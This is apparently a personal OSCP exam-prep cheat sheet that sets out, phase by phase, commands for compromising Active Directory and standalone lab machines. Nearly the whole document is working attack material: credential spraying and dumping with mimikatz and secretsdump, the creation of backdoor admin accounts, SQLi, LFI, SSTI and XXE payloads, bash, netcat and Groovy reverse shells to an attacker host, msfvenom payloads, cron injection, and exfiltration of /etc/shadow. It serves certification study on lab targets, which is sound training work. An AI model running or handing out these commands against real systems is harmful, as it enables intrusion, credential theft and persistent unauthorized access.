# OSCP EXAM COMMAND REFERENCE — PRACTICE

```
┌─────────────────────────────────────────────────────────────┐
│  SCORING: AD(40) + Bonus(10) + 1 local.txt(10) = 70 PASS   │
│  YOUR TIMELINE: AD first (4hrs) → Standalones (rotate 90m)  │
│  THE ONE RULE: Found creds? SPRAY EVERYTHING IN 60 SECONDS  │
└─────────────────────────────────────────────────────────────┘
```

---

## PHASE 0 — SETUP (First 30 Minutes)

### Start Scans on ALL 6 Machines
```bash
# Terminal 1-6: Full TCP scan on each machine
sudo nmap -Pn -n $IP -sC -sV -p- --open -oN tcp-$IP.nmap

# Or autorecon (runs nmap + gobuster + nikto automatically)
autorecon $IP --single-target --heartbeat 30

# UDP top 100 (background, don't wait for this)
sudo nmap -Pn -n $IP -sU --top-ports=100 --open -oN udp-$IP.nmap &
```

### Set Up Hosts File
```bash
echo "$DC_IP dc01 dc01.domain.local domain.local" >> /etc/hosts
echo "$MS01_IP ms01 ms01.domain.local" >> /etc/hosts
echo "$MS02_IP ms02 ms02.domain.local" >> /etc/hosts
```

### Prep Credential Tracking
```bash
touch /home/kali/master_creds.txt
touch /home/kali/master_hashes.txt
touch /home/kali/users.txt
```

### Start Listener + HTTP Server
```bash
# Terminal: shell catcher
sudo python3 penelope.py 443

# Terminal: file server
cd /home/kali/tools && python3 -m http.server 80
```

---

## PHASE 1 — AD SET (Hours 0.5–4, Target: 40 Points)

### 1A. Connect to First AD Machine
```bash
# Validate provided creds
nxc smb $MS01 -u '$USER' -p '$PASS'
nxc winrm $MS01 -u '$USER' -p '$PASS'

# Get a shell (try WinRM first, then RDP)
evil-winrm -i $MS01 -u '$USER' -p '$PASS' -d $DOMAIN

# Or RDP with shared drive for tool transfer
xfreerdp +clipboard /u:$DOMAIN\\$USER /p:'$PASS' /v:$MS01 /dynamic-resolution /drive:shared,/home/kali/tools /cert-ignore
```

### 1B. Immediate Domain Enumeration (Run ALL of These)
```bash
# BloodHound — do this FIRST, review while other scans run
bloodhound-python -u '$USER' -p '$PASS' -d $DOMAIN -ns $DC_IP -c all
# Upload JSONs to BloodHound → run:
#   "Shortest Paths to Domain Admins"
#   "Find Kerberoastable Users"
#   "Find AS-REP Roastable Users"
#   "Find Principals with DCSync Rights"

# Kerberoast + AS-REP Roast (run both, crack any hashes)
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile tgs.hash
impacket-GetNPUsers $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request -format hashcat -outputfile asrep.hash

# Crack immediately if hashes found
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# LDAP descriptions (passwords hiding in user descriptions)
nxc ldap $DC_IP -u '$USER' -p '$PASS' -M get-desc-users

# SMB shares — recursive listing on ALL AD machines
nxc smb $MS01 $MS02 $DC_IP -u '$USER' -p '$PASS' --shares
smbmap -H $DC_IP -u '$USER' -p '$PASS' -d $DOMAIN -R
smbmap -H $MS01 -u '$USER' -p '$PASS' -d $DOMAIN -R

# GPP passwords in SYSVOL
nxc smb $DC_IP -u '$USER' -p '$PASS' -M gpp_autologin
nxc smb $DC_IP -u '$USER' -p '$PASS' -M gpp_password

# Password policy (check lockout before spraying)
nxc smb $DC_IP -u '$USER' -p '$PASS' --pass-pol

# User enumeration
nxc smb $DC_IP -u '$USER' -p '$PASS' --users | tee domain_users.txt
```

### 1C. Local Enumeration on MS01 (After Getting Shell)
```powershell
# TIER 1 — Check within 30 seconds of landing
whoami /priv
# SeImpersonatePrivilege → GodPotato → DONE (see Potato section below)
# SeBackupPrivilege → Backup SAM/SYSTEM

whoami /groups
# Backup Operators? Server Operators? DnsAdmins? → See AD Priv Groups below

cmdkey /list
# Stored creds → runas /savecred /user:domain\admin cmd.exe

# TIER 2 — Credential hunting (2 minutes)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Autounattend.xml 2>nul
type C:\Windows\System32\Sysprep\Unattend.xml 2>nul
# Found base64 password? → decode:
powershell -c "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('BASE64HERE'))"

# PowerShell history for ALL users
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "=== $_ ==="; Get-Content $_ }

# AutoLogon in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr -i "DefaultUserName DefaultPassword"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# TIER 3 — Service-based privesc (5 minutes)
# Scheduled tasks
schtasks /query /fo LIST /v | findstr -i "Task To Run\|Run As User\|TaskName"
# Check writable paths: icacls "C:\path\from\task"

# Services with writable binaries
wmic service get name,pathname,startmode | findstr /v /i "C:\Windows" | findstr /v """
# Check permissions: icacls "C:\path\to\service.exe"

# Unusual folders in C:\ root
dir C:\ /a:d
# Look for: C:\Tasks, C:\Scripts, C:\Automation, C:\Backup, C:\Dev
```

### 1D. Escalate to Local Admin → Dump Creds
```bash
# === IF SeImpersonatePrivilege ===
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd123! /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup 'Remote Management Users' hacker /add"

# === IF writable scheduled task/service ===
# Replace the binary/script with:
net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add

# === DUMP EVERYTHING ONCE LOCAL ADMIN ===
nxc smb $MS01 -u hacker -p 'P@ssw0rd123!' --local-auth --sam
nxc smb $MS01 -u hacker -p 'P@ssw0rd123!' --local-auth --lsa
nxc smb $MS01 -u hacker -p 'P@ssw0rd123!' --local-auth -M lsassy

# Or with secretsdump
impacket-secretsdump hacker:'P@ssw0rd123!'@$MS01

# Or locally with mimikatz
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit"
```

### ⚠️ EVERY NEW CREDENTIAL → SPRAY IMMEDIATELY
```bash
# Add to master list
echo "newuser:newpass" >> /home/kali/master_creds.txt

# Spray ALL machines, ALL protocols
for IP in $MS01 $MS02 $DC_IP $STANDALONE1 $STANDALONE2 $STANDALONE3; do
  nxc smb $IP -u 'newuser' -p 'newpass' 2>/dev/null
  nxc winrm $IP -u 'newuser' -p 'newpass' 2>/dev/null
  nxc rdp $IP -u 'newuser' -p 'newpass' 2>/dev/null
  nxc ssh $IP -u 'newuser' -p 'newpass' 2>/dev/null
done

# Hash spray
for IP in $MS01 $MS02 $DC_IP; do
  nxc smb $IP -u 'user' -H 'NTLM_HASH' 2>/dev/null
  nxc winrm $IP -u 'user' -H 'NTLM_HASH' 2>/dev/null
done

# Spray against ALL domain users with new password
nxc smb $DC_IP -u users.txt -p 'newpass' --continue-on-success
```

### 1E. Pivot to MS02 / DC
```bash
# === LIGOLO-NG SETUP ===
# Kali: one-time setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Target: run agent (transfer via RDP shared drive or certutil)
.\agent.exe -connect $KALI_IP:11601 -ignore-cert

# Kali: add route + start
sudo ip route add 172.16.X.0/24 dev ligolo
# In proxy console: session → start

# Catch reverse shells through pivot
# In proxy: listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443 --tcp

# === CONNECT TO MS02 ===
evil-winrm -i $MS02 -u 'newuser' -p 'newpass' -d $DOMAIN
# Repeat 1C (local enum) and 1D (privesc + dump) on MS02
```

### 1F. Domain Escalation → DC
```bash
# If you have DA creds or hash → direct
impacket-psexec $DOMAIN/administrator:'password'@$DC_IP
impacket-psexec -hashes :HASH $DOMAIN/administrator@$DC_IP
evil-winrm -i $DC_IP -u administrator -H 'HASH' -d $DOMAIN

# DCSync (if you have Replication rights)
impacket-secretsdump $DOMAIN/user:pass@$DC_IP

# ADCS — if certipy found vulnerable template
certipy req -u user@$DOMAIN -p 'pass' -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn administrator@$DOMAIN -dc-ip $DC_IP
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# RBCD — if GenericWrite on computer object
impacket-addcomputer $DOMAIN/user:pass -computer-name 'FAKE$' -computer-pass 'Password123'
impacket-rbcd $DOMAIN/user:pass -action write -delegate-to TARGET$ -delegate-from FAKE$
impacket-getST $DOMAIN/'FAKE$':'Password123' -spn cifs/$DC_HOSTNAME -impersonate Administrator -dc-ip $DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass $DOMAIN/administrator@$DC_HOSTNAME

# WriteDACL → DCSync
impacket-dacledit -action write -rights DCSync -principal user -target-dn "DC=domain,DC=local" $DOMAIN/user:pass
impacket-secretsdump $DOMAIN/user:pass@$DC_IP

# ForceChangePassword
rpcclient -U 'user%pass' $DC_IP -c "setuserinfo2 target_user 23 'NewP@ss123!'"

# LAPS
nxc ldap $DC_IP -u user -p pass --module laps
nxc smb $DC_IP -u user -p pass --laps
```

### 1G. AD Proof Collection (ALL 3 MACHINES)
```powershell
# Screenshot EACH machine — you need all 3 for 40 points
type C:\Users\Administrator\Desktop\proof.txt && whoami && hostname && ipconfig
```

---

## PHASE 2 — BREAK (30 Minutes After AD, Hour 4–4.5)

```
Eat. Walk. Water. You have 40 points locked in.
If you have bonus points, you only need ONE local.txt to pass.
```

---

## PHASE 3 — STANDALONES (Hours 4.5–14, Target: 10-30 Points)

### ⏱️ 90-MINUTE RULE: No shell after 90 min → SCREENSHOT → MOVE ON

### 3A. Enumerate the Standalone (First 15 Minutes)

```bash
# Review nmap from Phase 0 (should be done by now)
cat tcp-$IP.nmap

# Web enumeration
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip,asp,aspx,jsp -t 50 -o gobuster.txt
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt

# HTTPS too (if 443/8443 open)
gobuster dir -u https://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -k

# Vhost/subdomain brute-force
gobuster vhost -u http://$DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Technology fingerprint
whatweb http://$IP
nikto -h http://$IP

# Check for anonymous access
smbclient -L //$IP -N
smbmap -H $IP
smbmap -H $IP -u '' -p ''
ftp $IP          # try anonymous / blank
nxc smb $IP -u 'guest' -p '' --shares

# SNMP (if UDP 161 open)
snmpwalk -v2c -c public $IP
snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### 3B. Identify the Technology → Searchsploit → Exploit

```bash
# STEP 1: Identify exact version of EVERYTHING
# Read web page source, headers, footers for version numbers
curl -v http://$IP 2>&1 | head -50

# STEP 2: Searchsploit every service
searchsploit <software> <version>
searchsploit -m <EDB-ID>    # Mirror to current dir

# STEP 3: Google "<software> <version> exploit RCE"

# CMS-specific scanners
wpscan --url http://$IP/wp --enumerate ap,at,u --api-token $TOKEN
droopescan scan drupal -u http://$IP
joomscan -u http://$IP
```

### 3C. Web Attack Checklist (Test Every Parameter)

```bash
# === SQLi ===
# Test on every input field, URL parameter, cookie, header
'
' OR 1=1-- -
' OR 1=1#
admin'--
' UNION SELECT 1,2,3-- -
' AND SLEEP(5)-- -

# Manual UNION-based extraction (NO SQLMAP ON EXAM)
# Step 1: Find column count
' ORDER BY 1-- -     (increment until error)
# Step 2: Find visible columns
' UNION SELECT 1,2,3-- -     (match column count, see which numbers display)
# Step 3: Extract data
' UNION SELECT 1,user(),database()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -

# Blind boolean extraction (when no output visible)
' AND SUBSTRING(database(),1,1)='a'-- -
' AND (SELECT COUNT(*) FROM users)>0-- -

# Time-based blind (when no difference in page response)
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -

# MSSQL command execution
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'powershell -e BASE64';-- -

# MSSQL NTLM theft (have responder running!)
'; EXEC xp_dirtree '\\$KALI_IP\share';-- -

# === LFI ===
../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
/var/log/apache2/access.log    # Log poisoning (inject PHP in User-Agent first)
..\..\..\..\windows\system32\drivers\etc\hosts

# === RFI ===
http://$KALI_IP/shell.php

# === File Upload ===
mv shell.php shell.php.jpg       # Double extension
mv shell.php shell.pHp           # Case change
# Add GIF89a; to top of PHP file  # Magic bytes
echo "AddType application/x-httpd-php .evil" > .htaccess    # Apache
# Upload web.config for IIS

# === Command Injection ===
; id
| id
$(id)
`id`
; ping -c 3 $KALI_IP    # Blind test

# === SSTI ===
{{7*7}}
${7*7}
<%= 7*7 %>
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# === XXE ===
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 3D. Default Credentials (Try Before Anything Complex)

```
admin:admin        admin:password      admin:Password1
guest:guest        root:root           root:toor
tomcat:s3cret      tomcat:tomcat       admin:admin123
user:user          test:test           <service>:<service>
<username>:<username>    (user=password, this cracked YOUR a practice attempt AD)
```

### 3E. Common CVE Footholds (Quick Reference)

```bash
# Tomcat Manager (if /manager/html accessible)
# Default creds: tomcat:s3cret, tomcat:tomcat, admin:admin
msfvenom -p java/shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o shell.war
curl -u 'tomcat:s3cret' --upload-file shell.war "http://$IP:8080/manager/text/deploy?path=/shell"
curl http://$IP:8080/shell/

# Jenkins Groovy Console (if /script accessible)
String host="$KALI_IP";int port=443;String cmd="/bin/bash";
Socket s=new Socket(host,port);Process p=[cmd].execute();
def is=p.inputStream,os=p.outputStream;def err=p.errorStream;
Thread.start{while((b=is.read())!=-1)s.outputStream.write(b)};
s.inputStream.eachLine{p.outputStream.write((it+"\n").bytes);p.outputStream.flush()};s.close()

# Jenkins CLI File Read (CVE-2024-23897)
java -jar jenkins-cli.jar -s http://$IP:8080 who-am-i @/etc/passwd

# WordPress
wpscan --url http://$IP/wp --enumerate ap,at,u --api-token $TOKEN
# Plugin exploits are the most common WP vector

# PHP 8.1.0-dev Backdoor
curl -H 'User-Agentt: zerodiumsystem("id");' http://$IP

# ActiveMQ (CVE-2023-46604)
# Metabase (CVE-2023-38646 — get token from /api/session/properties)
```

---

## PHASE 4 — LINUX STANDALONE PRIVESC

### First 30 Seconds
```bash
# The big three — check these IMMEDIATELY
sudo -l                                        # 25% of all Linux privesc
find / -perm -4000 -type f 2>/dev/null         # SUID binaries
id                                             # docker/lxd group?
```

### Next 5 Minutes
```bash
# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
crontab -l
# No visible crons? Run pspy:
./pspy64

# Capabilities
getcap -r / 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Internal services
ss -tlnp
# Anything on 127.0.0.1? → Port forward:
ssh -L 8080:127.0.0.1:8080 user@$IP

# Credential hunting
grep -rli 'password\|passwd\|pwd' /var/www/ /opt/ /home/ /etc/ 2>/dev/null
find / -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.bak" -o -name "*.ini" -o -name "*.kdbx" 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name ".git" -type d 2>/dev/null

# Running processes
ps auxww

# Automated (if nothing found yet)
./linpeas.sh
```

### Sudo/GTFOBins Exploits (Most Common)
```bash
# Check GTFOBins.github.io for EVERY binary in sudo -l
sudo vi -c '!sh'
sudo nano → Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo wget --post-file=/etc/shadow $KALI_IP
sudo easy_install /tmp/setup.py
```

### SUID Path Hijack
```bash
# If custom SUID binary calls another command without full path:
strings /path/to/suid_binary    # See what it calls
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/<called_command> && chmod +x /tmp/<called_command>
/path/to/suid_binary
```

### Container Escape
```bash
# Docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD group
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage pwn -c security.privileged=true
lxc config device add pwn mydevice disk source=/ path=/mnt/root recursive=true
lxc start pwn && lxc exec pwn /bin/sh
```

### Cron Exploitation
```bash
# Writable cron script → inject reverse shell
echo 'bash -i >& /dev/tcp/$KALI_IP/443 0>&1' >> /path/to/cron_script.sh

# Tar wildcard injection (if cron runs: tar czf backup.tar.gz *)
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/$KALI_IP/443 0>&1' >> shell.sh
```

---

## PHASE 5 — WINDOWS STANDALONE PRIVESC

### ⚡ First 5 Minutes After Foothold (This Is Where Your 10 Points Live)
```powershell
# RUN ALL OF THESE — NO SKIPPING (Lessons from multiple practice attempts)

# 1. Token privileges (28% of all Windows privesc)
whoami /priv
# SeImpersonatePrivilege     → GodPotato (see below)
# SeBackupPrivilege          → reg save HKLM\SAM C:\sam && reg save HKLM\SYSTEM C:\sys
# SeRestorePrivilege         → Replace service binary
# SeManageVolumePrivilege    → Read any file on disk

# 2. Groups
whoami /groups
# Administrators? → UAC bypass or you're already admin
# Backup Operators? → Copy SAM/SYSTEM

# 3. Stored creds
cmdkey /list
# If found → runas /savecred /user:domain\admin cmd.exe

# 4. Unattend.xml (Common mistake: not reading this IN PRACTICE)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Autounattend.xml 2>nul
type C:\Windows\System32\Sysprep\Unattend.xml 2>nul
# Decode base64: powershell -c "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VALUE'))"

# 5. PowerShell history
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "=== $_ ==="; Get-Content $_ }

# 6. AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr -i "DefaultPassword"

# 7. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
# Both = 0x1? → msfvenom MSI reverse shell → msiexec /quiet /qn /i evil.msi
```

### GodPotato (SeImpersonatePrivilege → SYSTEM)
```powershell
# Upload GodPotato + nc.exe, then:
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd123! /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c C:\Users\Public\nc.exe $KALI_IP 443 -e cmd.exe"

# Alternatives if GodPotato fails:
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe $KALI_IP 443 -e cmd.exe"
.\SweetPotato.exe -p C:\Users\Public\nc.exe -a "$KALI_IP 443 -e cmd.exe"
```

### Service/DLL Abuse (31% of Windows Privesc)
```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows" | findstr /v """
# Check writable dirs: icacls "C:\Program Files\Vulnerable\"

# Writable service binaries
sc query state=all | findstr SERVICE_NAME
# For each: sc qc <service_name> → check BINARY_PATH_NAME → icacls that path

# Scheduled tasks with writable paths
schtasks /query /fo LIST /v
# Check: icacls "C:\path\to\task\script"

# If writable → replace binary with reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe -o rev.exe
# Transfer, replace binary, restart service:
sc stop <service>
copy rev.exe "C:\path\to\service.exe"
sc start <service>
```

### AlwaysInstallElevated (Instant SYSTEM)
```bash
# If BOTH registry keys = 0x1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
# Transfer to target, then:
msiexec /quiet /qn /i C:\Users\Public\evil.msi
```

---

## CREDENTIAL SPRAY WORKFLOW (Use Every Time You Find ANYTHING)

```bash
# The #1 lesson from 4 attempts: SPRAY IMMEDIATELY, DON'T WAIT

# Password spray
for IP in $IP1 $IP2 $IP3 $IP4 $IP5 $IP6; do
  echo "--- $IP ---"
  nxc smb $IP -u 'USER' -p 'PASS' 2>/dev/null
  nxc winrm $IP -u 'USER' -p 'PASS' 2>/dev/null
  nxc rdp $IP -u 'USER' -p 'PASS' 2>/dev/null
  nxc ssh $IP -u 'USER' -p 'PASS' 2>/dev/null
done

# Hash spray
for IP in $IP1 $IP2 $IP3 $IP4 $IP5 $IP6; do
  nxc smb $IP -u 'USER' -H 'HASH' 2>/dev/null
  nxc winrm $IP -u 'USER' -H 'HASH' 2>/dev/null
done
evil-winrm -i $IP -u 'USER' -H 'HASH'

# Domain-wide spray with new password
nxc smb $DC_IP -u users.txt -p 'NEWPASS' --continue-on-success

# ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED?
# Password IS VALID. RDP won't work but these might:
evil-winrm -i $IP -u 'USER' -p 'PASS'
impacket-smbexec $DOMAIN/'USER':'PASS'@$IP
impacket-wmiexec $DOMAIN/'USER':'PASS'@$IP
impacket-psexec $DOMAIN/'USER':'PASS'@$IP
# Or change the password:
smbpasswd -r $IP -U 'DOMAIN/USER'
impacket-changepasswd $DOMAIN/'USER':'OLDPASS'@$IP -newpass 'NewP@ssw0rd!'
```

---

## HASH CRACKING QUICK REFERENCE

```bash
# Identify hash type
hashid -m "hash_here"

# Crack by type
hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force   # AS-REP
hashcat -m 13100 tgs.hash rockyou.txt --force                                              # Kerberoast
hashcat -m 1000  ntlm.hash rockyou.txt --force                                             # NTLM
hashcat -m 5600  ntlmv2.hash rockyou.txt --force                                           # NTLMv2
hashcat -m 3200  bcrypt.hash rockyou.txt                                                    # bcrypt
hashcat -m 1800  sha512.hash rockyou.txt --force                                            # SHA-512 crypt

# john converters
ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt
keepass2john db.kdbx > kp.hash && john kp.hash --wordlist=rockyou.txt
zip2john file.zip > zip.hash && john zip.hash --wordlist=rockyou.txt
pfx2john cert.pfx > pfx.hash && john pfx.hash --wordlist=rockyou.txt

# AES-256 ZIP (YOUR a practice attempt lesson — fcrackzip and unzip WILL NOT WORK)
zip2john encrypted.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
7z x -p"cracked_password" encrypted.zip    # Extract with 7z, NOT unzip

# GPP cpassword
gpp-decrypt "cpassword_value"
```

---

## FILE TRANSFERS

```bash
# === KALI → LINUX TARGET ===
# On Kali: python3 -m http.server 80
wget http://$KALI/file -O /tmp/file
curl http://$KALI/file -o /tmp/file

# === KALI → WINDOWS TARGET ===
# PowerShell
iwr -uri http://$KALI/file -Outfile C:\Users\Public\file
(New-Object Net.WebClient).DownloadFile('http://$KALI/file','C:\Users\Public\file')
certutil -urlcache -f http://$KALI/file C:\Users\Public\file

# SMB (if PowerShell constrained)
# Kali: impacket-smbserver share $(pwd) -smb2support -username user -password pass
net use \\$KALI\share /u:user pass
copy \\$KALI\share\file C:\Users\Public\file

# === EXFIL TARGET → KALI ===
# Kali: nc -lvnp 9001 > loot.txt
# Target: nc $KALI 9001 < /path/to/file
# Or via SMB: copy C:\loot.txt \\$KALI\share\
```

---

## REVERSE SHELLS

```bash
# === LINUX ===
bash -i >& /dev/tcp/$KALI/443 0>&1
bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$KALI",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# === WINDOWS ===
powershell -e <BASE64>
.\nc.exe $KALI 443 -e cmd.exe
# Generate payloads:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe -o rev.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o rev.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o rev.msi
msfvenom -p java/shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o shell.war

# === UPGRADE SHELL (do immediately) ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160
```

---

## PROOF COMMANDS (Screenshot These!)

```bash
# === LINUX ===
cat /root/proof.txt && whoami && hostname && ip addr show
cat /home/<user>/local.txt && whoami && hostname && ip addr show

# === WINDOWS ===
type C:\Users\Administrator\Desktop\proof.txt && whoami && hostname && ipconfig
type C:\Users\<user>\Desktop\local.txt && whoami && hostname && ipconfig
```

---

## AD PRIVILEGE GROUPS — INSTANT WINS

```
Backup Operators / SeBackupPrivilege:
  reg save HKLM\SAM C:\tmp\sam
  reg save HKLM\SYSTEM C:\tmp\sys
  # Exfil → impacket-secretsdump -sam sam -system sys LOCAL

Server Operators:
  sc config <service> binpath= "C:\Users\Public\rev.exe"
  sc stop <service> && sc start <service>

DnsAdmins:
  # Create malicious DLL, then:
  dnscmd $DC /config /serverlevelplugindll \\$KALI\share\evil.dll
  sc stop dns && sc start dns

Account Operators:
  # Can create/modify non-admin accounts → pivot

LAPS Readers:
  nxc ldap $DC -u user -p pass --module laps
```

---

## WHEN YOU'RE STUCK (Anti-Rabbit-Hole Protocol)

```
STUCK 30 min on foothold?
  → Re-read ALL nmap output line by line — did you miss a port?
  → Re-run gobuster with DIFFERENT wordlist + extensions
  → Check for vhosts: gobuster vhost -u http://$DOMAIN
  → Try credentials from OTHER machines
  → Read the actual web page content — clues in plain sight

STUCK 30 min on privesc?
  → Run linpeas/winpeas if you haven't
  → Check internal services: ss -tlnp / netstat -ano
  → Re-read config files with your new user permissions
  → Look for database files, KeePass, SSH keys
  → Check scheduled tasks / cron jobs more carefully

STUCK 90 min total on any standalone?
  → MOVE ON. Screenshot everything. Come back later.
  → Creds from other machines may unlock this one.
```

---

## Practice scenario-DAY TIMELINE

```
Hour 0-0.5     Setup + nmap all 6 machines
Hour 0.5-4     AD Set → 40 points (you've done this twice, trust it)
Hour 4-4.5     BREAK — eat, walk, water
Hour 4.5-6     Standalone #1 — pick clearest attack surface
Hour 6         90-MIN CHECK: no shell? → move to Standalone #2
Hour 6-7.5     Standalone #2
Hour 7.5       90-MIN CHECK: no shell? → move to Standalone #3
Hour 7.5-9     Standalone #3
Hour 9-9.5     BREAK
Hour 9.5-14    Return to stuck machines with fresh eyes + creds from others
Hour 14+       REPORT WRITING (start immediately at 70+ points)

REMEMBER: AD(40) + Bonus(10) + ANY local.txt(10) = 70 = PASS
```
